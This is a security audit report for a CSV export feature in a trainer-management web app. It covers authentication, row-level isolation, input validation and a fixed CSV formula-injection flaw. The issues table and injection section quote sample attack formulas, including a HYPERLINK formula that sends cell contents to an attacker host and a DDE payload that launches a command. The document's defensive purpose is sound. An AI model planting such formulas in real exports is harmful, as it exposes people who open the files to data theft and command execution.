# Security Audit: CSV Data Export

## Audit Date
2026-02-21

## Files Audited
- `backend/trainer/services/export_service.py` -- Export service (3 export functions)
- `backend/trainer/export_views.py` -- 3 API views (PaymentExportView, SubscriberExportView, TraineeExportView)
- `backend/trainer/utils.py` -- `parse_days_param` utility
- `backend/trainer/urls.py` -- URL wiring
- `backend/trainer/tests/test_export.py` -- Test suite
- `web/src/components/shared/export-button.tsx` -- Frontend download component
- `web/src/lib/constants.ts` -- API URL constants

## Checklist
- [x] No secrets, API keys, passwords, or tokens in source code or docs
- [x] All user input sanitized (CSV injection fix applied, `days` param clamped)
- [x] Authentication checked on all new endpoints (`IsAuthenticated` on all 3 views)
- [x] Authorization -- correct role/permission guards (`IsTrainer` on all 3 views)
- [x] No IDOR vulnerabilities (every queryset filters by `trainer=request.user` or `parent_trainer=request.user`)
- [x] No CSV injection risk (**FIXED** -- `_sanitize_csv_value()` added, applied to all user-controlled fields)
- [x] Error messages don't leak internals (frontend shows generic toasts; backend returns standard DRF error responses)
- [x] No file uploads in this feature
- [x] CORS policy appropriate (restricted in production, open only in DEBUG mode)
- [x] Rate limiting -- relies on global DRF throttling (acceptable for authenticated trainer-only GET endpoints)

## Issues Found

| # | Severity | Type | File:Line | Issue | Fix |
|---|----------|------|-----------|-------|-----|
| 1 | **High** | CSV Injection (CWE-1236) | `export_service.py:99-134` (all three export functions) | User-controlled strings (trainee names, emails, payment descriptions, program names) were written directly into CSV cells without sanitization. A malicious trainee could set their name to `=HYPERLINK("http://evil.com","Click")` or `=cmd\|'/C calc'!A0`. When the trainer opens the CSV in Excel/Sheets, the formula executes. | **FIXED.** Added `_sanitize_csv_value()` function that prefixes values starting with `=`, `+`, `-`, `@`, `\t`, or `\r` with a single-quote (`'`), forcing spreadsheet apps to treat them as text literals. Applied to all user-controlled fields across all three export functions. Updated `_safe_str()` to also route through sanitization. |
| 2 | **Low** | Missing `nosniff` header on CSV response | `export_views.py:26` | The CSV response does not explicitly set `X-Content-Type-Options: nosniff`. Django's `SecurityMiddleware` handles this globally if enabled, but it is worth noting. | No action needed -- Django's `SecurityMiddleware` is in `MIDDLEWARE` and sets this header automatically on all responses. |
| 3 | **Info** | No per-endpoint rate limiting | `export_views.py:32-68` | Export endpoints have no explicit throttle. A script could hit the endpoint in a tight loop, generating CPU/DB load for large datasets. | Acceptable risk. These are authenticated, trainer-only endpoints. DRF's global throttling applies. If abuse is observed, add `UserRateThrottle` with e.g. `10/minute` scope. |

## Detailed Analysis

### SECRETS
Grepped all changed files for `api_key`, `secret_key`, `password`, `token`, `SECRET`, `PRIVATE_KEY`, `AWS_ACCESS` (case-insensitive). No hardcoded secrets found. The frontend `export-button.tsx` references `getAccessToken` from `token-manager` which is the standard JWT flow -- no secrets are embedded in source.

### INJECTION

**CSV Injection (CWE-1236) -- FIXED:**
The original code wrote user-controlled values (trainee `first_name`, `last_name`, `email`, payment `description`, program `name`) directly into CSV cells via `csv.writer.writerow()`. Python's `csv` module correctly handles RFC 4180 quoting (commas, quotes), but it does NOT protect against spreadsheet formula injection. A value like `=SUM(1+1)` or `=HYPERLINK("http://attacker.com/steal?cookie="&A1,"Click me")` would be interpreted as a formula in Excel, Google Sheets, and LibreOffice Calc.

**Fix applied:** Added `_sanitize_csv_value()` that detects dangerous first characters (`=`, `+`, `-`, `@`, `\t`, `\r`) and prepends a single-quote (`'`). This is the OWASP-recommended mitigation. The function is applied to every user-controlled string field in all three export functions.

**SQL Injection:** Not applicable. All queries use Django ORM with parameterized queries. No raw SQL.

**Command Injection / Path Traversal:** Not applicable. No shell commands executed. The `filename` in `Content-Disposition` is built from a hardcoded prefix + date string (`payments_2026-02-21.csv`), not from user input.

### AUTH/AUTHZ
All three export views use `permission_classes = [IsAuthenticated, IsTrainer]`:
- `IsAuthenticated` ensures JWT token is valid (returns 401 otherwise)
- `IsTrainer` checks `request.user.is_trainer()` (returns 403 otherwise)

The permission stack is correct and matches the existing trainer endpoint pattern.

### ROW-LEVEL SECURITY (IDOR Prevention)
Each export function queries only the authenticated trainer's data:
- `export_payments_csv`: `TraineePayment.objects.filter(trainer=trainer, ...)`
- `export_subscribers_csv`: `TraineeSubscription.objects.filter(trainer=trainer)`
- `export_trainees_csv`: `User.objects.filter(parent_trainer=trainer, role=TRAINEE)`

There are no ID parameters in the URL that could be manipulated. The trainer is always derived from `request.user` via JWT. Test suite includes explicit isolation tests proving trainer A cannot see trainer B's data across all three endpoints.

### DATA EXPOSURE
The CSV exports expose trainee emails, names, payment amounts, and subscription status. This is appropriate -- the trainer already has access to all this data through the dashboard UI. No sensitive fields are leaked beyond what the trainer can already see (no password hashes, no Stripe customer IDs, no internal PKs).

### INPUT VALIDATION
The `days` query parameter is validated in `parse_days_param()`:
- Parsed as `int` with try/except for `ValueError`/`TypeError`
- Clamped to range `[1, 365]` via `min(max(int(...), 1), 365)`
- Falls back to default `30` on any parse failure

This prevents negative values, zero, absurdly large numbers, and non-numeric input.

### CORS/CSRF
- CORS is configured via `corsheaders` middleware
- In production: `CORS_ALLOW_ALL_ORIGINS = False`, restricted to `CORS_ALLOWED_ORIGINS` env var
- In development: `CORS_ALLOW_ALL_ORIGINS = True` (acceptable for local dev)
- CSRF is not relevant -- these are JWT-authenticated API endpoints (no session cookies)

### FRONTEND SECURITY
The `ExportButton` component:
- Uses `fetch()` with explicit `Authorization: Bearer` header (no cookies sent)
- Does not pass user input into the URL (URL is constructed from hardcoded constants + server-side `days` state variable)
- Handles 401 by redirecting to `/login` (standard auth flow)
- Handles 403 with a user-friendly error toast (no internal details leaked)
- Uses `URL.createObjectURL()` + `URL.revokeObjectURL()` for blob download (no XSS vector)
- The `filename` prop is constructed from hardcoded strings, not user input

## Security Score: 9/10

The single High-severity issue (CSV injection) has been fixed. The implementation is solid across all security dimensions: proper auth, correct row-level isolation, no secrets, no injection vectors, safe error messages, and defense-in-depth input validation.

The remaining point deduction is for the absence of per-endpoint rate limiting on export endpoints, which is a minor concern given the existing global throttle and the small attack surface (authenticated trainers only).

## Recommendation: PASS
